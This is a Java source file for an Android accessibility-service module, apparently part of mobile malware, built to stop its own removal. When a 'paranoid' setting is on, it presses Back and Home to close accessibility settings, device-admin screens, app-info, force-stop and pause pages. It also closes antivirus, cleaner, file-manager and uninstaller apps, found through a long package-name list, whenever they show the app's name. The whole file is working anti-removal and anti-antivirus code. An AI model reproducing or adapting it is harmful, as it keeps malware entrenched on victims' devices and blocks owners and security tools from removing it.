package com.service.app.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.service.app.Services.Access;
import com.service.app.Services.utils;
import com.service.app.defines;

public class antidisablemodule {
    static utils utl = new utils();
    static defines consts = new defines();
    static UtilAccess UtilAccessibility = new UtilAccess();

    private static final String TAG = antidisablemodule.class
            .getSimpleName();

    public static void performIfNecessary(AccessibilityService service, AccessibilityEvent event) {
        if (event.getPackageName() == null || event.getSource() == null) {
            return;
        }

        if (isAccessibilityWindowMax(service, event)) {
            Log.d(TAG, "Calling exitAccessibilityWindow");
            exitAccessibilityWindow(service, event);
        } else if (isAdminSettingsOpen(service, event)) {
            Log.d(TAG, "Calling exitAdminSettingsWindow");
            exitAccessibilityWindow(service, event);
        } else if (isAppSettingsWindowOpen(service, event)) {
            Log.d(TAG, "Calling exitAccessibilityWindow");
            exitAccessibilityWindow(service, event);
        } else if (isAppPause(service, event)) {
            Log.d(TAG, "Calling exit settings");
            exitAccessibilityWindow(service, event);
        }
        isAVDetect(service, event);
    }

    private static boolean isAppSettingsWindowOpen(AccessibilityService service, AccessibilityEvent event) {
        boolean isCorrectClass = UtilAccessibility.getEventClassName(event).toLowerCase().contains("settings.subsettings");
        boolean isCorrectClassForSamsung = UtilAccessibility.getEventClassName(event).toLowerCase().contains("activity.subsettings");
        boolean containsAppName = UtilAccessibility.findFirstNodeByName(service, event.getSource(), utl.getLabelApplication(service)) != null;
        boolean notNotificationClass = !(UtilAccessibility.getEventClassName(event).toLowerCase().contains("notificationaccesssettingsactivity"));
        return (isCorrectClass || isCorrectClassForSamsung) && containsAppName && notNotificationClass && canMaxPrevent(service);
    }

    private static boolean isAdminSettingsOpen(AccessibilityService service, AccessibilityEvent event) {
        boolean containsAppName = UtilAccessibility.findFirstNodeByContainsName(service, event.getSource(), utl.getLabelApplication(service).toLowerCase()) != null;
        boolean eventContainsAppName = event.getSource().getText() != null ? event.getSource().getText().toString().toLowerCase().contains(utl.getLabelApplication(service)) : false;

        boolean containsWordAdmin = false;
        boolean eventContainsWordAdmin = false;

        for (String str : consts.adminLabelList) {
            containsWordAdmin = UtilAccessibility.findFirstNodeByContainsName(service, event.getSource(), str.toLowerCase()) != null;
            eventContainsWordAdmin = event.getSource().getText() != null ? event.getSource().getText().toString().toLowerCase().contains(utl.getLabelApplication(service))  : false;
        }

        boolean isAdminClass = event.getSource().getClassName() != null ? event.getSource().getClassName().toString().toLowerCase().equals("com.android.settings.deviceadminadd") : false;
        return ((((containsAppName || eventContainsAppName) && ( containsWordAdmin || eventContainsWordAdmin)) || isAdminClass) && canMaxPrevent(service));
    }

    private static boolean isAccessibilityWindowMax(AccessibilityService service, AccessibilityEvent event) {
        boolean containsAccessabilityText = UtilAccessibility.findNodesByNames(event.getSource(), consts.accessibilityLabelList, true).size() > 0;
        boolean containsAccessabilityShortcutText = UtilAccessibility.findNodesByNames(event.getSource(), consts.accessibilityShortcutList, true).size() > 0;
        boolean containsAppName = UtilAccessibility.findFirstNodeByName(service, event.getSource(), utl.getServiceLabel(service, Access.class)) != null;
        return  event.getText().contains(utl.getServiceLabel(service, Access.class)) || (containsAccessabilityText && (containsAppName || containsAccessabilityShortcutText)) && canMaxPrevent(service);
    }

    private static boolean isAppPause(AccessibilityService service, AccessibilityEvent event) {
        boolean containsAppName = UtilAccessibility.findFirstNodeByName(service, event.getSource(), utl.getLabelApplication(service)) != null;
        boolean containsPauseText = UtilAccessibility.findNodesByNames(event.getSource(), consts.pauseLabelList, true).size() > 0;
        boolean containsForceText = UtilAccessibility.findNodesByNames(event.getSource(), consts.forcestopList, true).size() > 0;

        return (containsPauseText || containsForceText) && containsAppName && canMaxPrevent(service);
    }

    public static boolean isAVDetect(AccessibilityService service, AccessibilityEvent event) {
        if (event.getPackageName().toString().contains("clean") ||
                event.getPackageName().toString().contains("eset") ||
                event.getPackageName().toString().contains("antivirus") ||
                event.getPackageName().toString().contains("remove") ||
                event.getPackageName().toString().contains("clean") ||
                event.getPackageName().toString().contains("avg") ||
                event.getPackageName().toString().contains("com.kms.free") ||
                event.getPackageName().toString().contains("manager") ||
                event.getPackageName().toString().contains("simplitec") ||
                event.getPackageName().toString().contains("optimiz") ||
                event.getPackageName().toString().contains("master") ||
                event.getPackageName().toString().contains("stolitomson") ||
                event.getPackageName().toString().contains("virus") ||
                event.getPackageName().toString().contains("clear") ||
                event.getPackageName().toString().contains("boost") ||
                event.getPackageName().toString().contains("secure") ||
                event.getPackageName().toString().contains("security") ||
                event.getPackageName().toString().contains("looploop") ||
                event.getPackageName().toString().contains("thedarken") ||
                event.getPackageName().toString().contains("housechores") ||
                event.getPackageName().toString().contains("care") ||
                event.getPackageName().toString().contains("iobit") ||
                event.getPackageName().toString().contains("com.lookout") ||
                event.getPackageName().toString().contains("com.avira") ||
                event.getPackageName().toString().contains("com.eset") ||
                event.getPackageName().toString().contains("malware") ||
                event.getPackageName().toString().contains("com.psafe") ||
                event.getPackageName().toString().contains("defender") ||
                event.getPackageName().toString().contains("com.wsandroid") ||
                event.getPackageName().toString().contains("trendmicro") ||
                event.getPackageName().toString().contains("quickheal") ||
                event.getPackageName().toString().contains("mobikeeper") ||
                event.getPackageName().toString().contains("com.drweb") ||
                event.getPackageName().toString().contains("com.ctt.guard") ||
                event.getPackageName().toString().contains("guard") ||
                event.getPackageName().toString().contains("scandrive") ||
                event.getPackageName().toString().contains("com.androidarmy") ||
                event.getPackageName().toString().contains("com.estsoft") ||
                event.getPackageName().toString().contains("com.avg") ||
                event.getPackageName().toString().contains("com.androidarmy") ||
                event.getPackageName().toString().contains("com.sophos") ||
                event.getPackageName().toString().contains("httpcanary") ||
                event.getPackageName().toString().contains("br.com.mobil")
        ) {
            if (event.getClassName().toString().equals("android.widget.TextView")) {
                if (event.getText().toString().contains(utl.getLabelApplication(service).toLowerCase())) {
                    try {
                        exitAccessibilityWindow(service, event);
                        return true;
                    } catch (Exception err) {}
                }
            }
        }
        else if (event.getPackageName().toString().toLowerCase().contains("com.wsandroid.suite") || event.getPackageName().toString().toLowerCase().contains("com.totalav.android") || event.getPackageName().toString().toLowerCase().contains("com.avira.android") || event.getPackageName().toString().toLowerCase().contains("com.kms.free") || event.getPackageName().toString().toLowerCase().contains("com.iobit.mobilecare") || event.getPackageName().toString().toLowerCase().contains("com.stolitomson") || event.getPackageName().toString().toLowerCase().contains("com.eset.ems2.gp") ||  event.getPackageName().toString().toLowerCase().contains("remover") || event.getPackageName().toString().toLowerCase().contains("manage") ||  event.getPackageName().toString().toLowerCase().contains("delete") ||  event.getPackageName().toString().toLowerCase().contains("fileexplorer") || event.getPackageName().toString().toLowerCase().contains("esfile") || event.getPackageName().toString().toLowerCase().contains("uninstall") || event.getPackageName().toString().toLowerCase().contains("remove") || event.getPackageName().toString().toLowerCase().contains("com.splendapps.shark") || event.getPackageName().toString().toLowerCase().contains("unused") || event.getPackageName().toString().toLowerCase().contains("com.systweak.systemoptimizer") || event.getPackageName().toString().toLowerCase().contains("clean") || event.getPackageName().toString().toLowerCase().contains("antivirus") || event.getPackageName().toString().toLowerCase().contains("virus") || event.getPackageName().toString().toLowerCase().contains("security") || event.getPackageName().toString().toLowerCase().contains("com.estrongs.android.pop")  ) {
            if (event.getClassName().toString().contains("android.widget.TextView")) {
                if (event.getText().toString().contains(utl.getLabelApplication(service).toLowerCase())) {
                    try {
                        exitAccessibilityWindow(service, event);
                        return true;
                    } catch (Exception err) {
                    }
                }
            }
        }

        return false;
    }

    private static void exitAccessibilityWindow(AccessibilityService service, AccessibilityEvent event) {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    public static boolean canMaxPrevent(AccessibilityService service){
        String paranoidValue = utl.SettingsRead(service.getApplicationContext(), "paranoid");
        boolean paranoid = (paranoidValue != null && paranoidValue.equals("1"));
        return (paranoid);
    }

}
